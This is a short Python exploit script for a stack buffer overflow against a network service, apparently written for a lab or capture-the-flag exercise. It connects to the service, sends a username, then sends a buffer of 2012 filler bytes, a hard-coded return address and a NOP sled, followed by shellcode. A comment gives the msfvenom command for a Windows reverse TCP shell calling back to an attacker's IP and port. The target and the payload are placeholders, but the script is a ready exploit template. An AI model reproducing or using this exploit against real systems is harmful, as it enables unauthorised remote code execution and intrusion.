#!/usr/bin/env python3

import socket, time, sys

ip = "Service IP"
port = (Service Port)
timeout = 5

# You can pass anything user you wanted
prefix = "SomeUser"

# Just \x00 is not accepted

bad = "" 


# msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=(YOUR_PORT) EXITFUNC=thread -b "\x00" -f c
shellcode = ("Your Shellcode here")

string = prefix + "\r\n"

# 2012 bytes of offset +  + NOPS sledding + reverse shell
buffer =  "A" * 2012 + "\xdf\x14\x50\x62" + "\x90" * 10 + shellcode


try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)

      # connecting to service
      s.connect((ip, port))

      # receiving first banner
      print(s.recv(1024).decode())
      print("[*] Connected")

      # Sending the user
      print(f"[*] User {prefix} sent")
      s.send(bytes(string, "latin-1"))

      # receiving second banner
      print(s.recv(1024).decode())

      # Sending payload
      s.send(bytes(buffer, "latin-1"))
      print("[*] Sending Evil buffer...")
      print("[*] Done!")
      s.close()

except:
  print("Can't connect")
  sys.exit(0)
